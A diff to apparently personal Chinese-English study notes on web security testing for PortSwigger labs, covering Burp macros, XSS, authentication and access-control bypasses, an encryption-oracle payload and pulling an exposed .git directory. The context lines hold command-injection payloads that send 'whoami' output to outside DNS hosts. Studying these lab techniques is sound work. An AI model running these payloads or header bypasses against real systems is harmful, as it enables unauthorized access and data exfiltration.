@@ -71,6 +71,16 @@ X-Custom-Ip-Authorization: 127.0.0.1
 3. **Pitchfork**: 音叉，每个变量一个字典。一次失败后，三个变量同时改变，一个变量不会与另一个变量所有情况匹配到。
 4. **Cluster bomb**: 集束炸弹，笛卡尔积，形式，每隔一个变量要与另一个变量所有情况测试到，在多个字典情况下，测试时间非常漫长。
 
+### Macro
+
+**宏(Macro)** 是**一组预先录制好的 HTTP 请求序列**，用来让 Burp 自动执行某些重复操作。
+
+> A macro is a sequence of one or more requests. You can use macros within session handling rules to perform tasks such as logging in to the application, obtaining anti-CSRF tokens, etc. Use these settings to manage your macros.
+
+- **自动登录**：先请求登录页，提取 CSRF token，再提交用户名密码。
+- **刷新 session/cookie**：当目标返回 401、302 到登录页时，自动重新获取会话。
+- **更新 CSRF token**：每次攻击请求前自动访问页面，提取新的 token 并替换到请求里。
+- **配合 Scanner/Intruder/Repeater**：让这些工具在测试时始终使用有效会话。
 
 ---
 
@@ -221,6 +231,12 @@ select name, pass from users;
 
 ---
 
+## XSS
+
+[Cross-site scripting](../vuln/XSS.md) (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.
+
+---
+
 ## File upload vulnerabilities
 
 [File upload vulnerabilities](../vuln/FileVuln.md#file-upload)
@@ -291,3 +307,116 @@ def ping_host(user_input
 & nslookup kgji2ohoyw.web-attacker.com &
 ||nslookup+`whoami`.xxx.oastify.com||
 ```
+---
+
+## Authentication
+
+[portswigger-authentication](https://portswigger.net/web-security/authentication)
+
+**身份验证漏洞(Authentication Vulnerabilities)** 指应用或系统在确认用户、服务或设备身份的过程中存在的安全缺陷。如果身份验证机制不够安全，攻击者就可以绕过这些机制，冒充合法用户（甚至管理员）来获取未授权的访问权限。
+
+**认证 vs 授权**
+
+- **Authentication（认证）**：确认"你是谁"，验证用户身份是否真实。
+- **Authorization（授权）**：确认"你能做什么"，验证已认证用户的访问权限。
+
+认证是第一道门。一旦被绕过，后续基于身份的访问控制基本全部失效，因此危害通常很高。
+
+**三种认证因素**
+
+| 类型 | 含义 | 示例 |
+|---|---|---|
+| Knowledge（知识）| 你知道的东西 | 密码、PIN、安全问题 |
+| Possession（持有）| 你拥有的东西 | 手机、硬件令牌、OTP |
+| Inherence（固有）| 你本身的特征 | 指纹、人脸、虹膜 |
+
+多因素认证(MFA)即组合使用两种及以上不同类型的因素。
+
+### bypass
+
+**IP-based brute-force protection**
+
+```bash
+X-Forwarded-For: §2§
+```
+
+
+**X-Forwarded-Host**
+
+`X-Forwarded-Host` 是代理类 HTTP 头，用来记录客户端原始请求里的 `Host` 值。
+
+- 用于维护对原始主机的引用
+
+```bash
+X-Forwarded-Host: <original-host>
+```
+---
+
+## Business logic
+
+**Business logic vulnerabilities** are flaws in the design and implementation of an application that allow an attacker to elicit unintended behavior. This potentially enables attackers to manipulate legitimate functionality to achieve a malicious goal.
+
+### Encryption Oracle
+
+[Encryption Oracle](../common.md#encryption-oracle) （Encryption Oracle）：
+一个允许攻击者输入任意明文，并会返回对应密文的系统（或服务）。
+
+在安全分析中，攻击者通常不知道系统内部的加密密钥（Key）和具体实现细节，但他们有办法让系统帮他们加密数据。
+
+**PoC**
+
+[Lab: Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
+
+- **block-based encryption** algorithm is used and that the input length must be a **multiple of 16**
+```bash
+xxxxxxxxxadministrator:your-timestamp
+```
+
+## Information disclosure
+
+**Information disclosure**, also known as **information leakage**, is when a website unintentionally reveals sensitive information to its users. 
+
+### TRACE
+
+HTTP `TRACE` 是一种 HTTP 请求方法，用于让服务器**回显它收到的请求内容**，主要用于调试、诊断请求在客户端到服务器之间是否被代理、网关或中间设备修改。
+
+- `TRACE` 的作用不是获取资源或提交数据，而是让服务器把接收到的请求原样返回，以便定位网络或协议层问题
+- [伪造客户端IP地址](#burpsuit)
+
+### version control history
+
+```bash
+# download .git 
+wget -r https://xxx.web-security-academy.net/.git
+
+# 查看 git状态
+git status
+# 简洁的一行格式查看 Git 提交历史
+git log --oneline
+# 切换分支或恢复文件状态
+git checkout 2fb9eb5
+```
+
+## Access control
+
+Access control is the application of constraints on who or what is authorized to perform actions or access resources. 
+
+- **Authentication** confirms that the user is who they say they are
+- **Session management** identifies which subsequent HTTP requests are being made by that same user.
+- **Access control** determines whether the user is allowed to carry out the action that they are attempting to perform.
+
+### Non-standard HTTP headers
+
+Some application frameworks support various non-standard HTTP headers that can be used to override the URL in the original request, such as `X-Original-URL` and `X-Rewrite-URL`.If a website uses rigorous front-end controls to restrict access based on the URL, but the application allows the URL to be overridden via a request header, then it might be possible to bypass the access controls using a request like the following:
+
+```bash
+POST / HTTP/1.1
+X-Original-URL: /admin/deleteUser
+...
+```
+- `X-Original-URL` 是一个非标准的 HTTP 请求头，通常用于在经过反向代理、网关或 URL 重写组件处理后，**记录“客户端最初请求的 URL/路径”**
+
+### Referer
+
+`Referer` 用来表示“当前请求是从哪个页面跳转或发起过来的”。浏览器通常会对来自某个页面的请求自动添加这个头部。
+
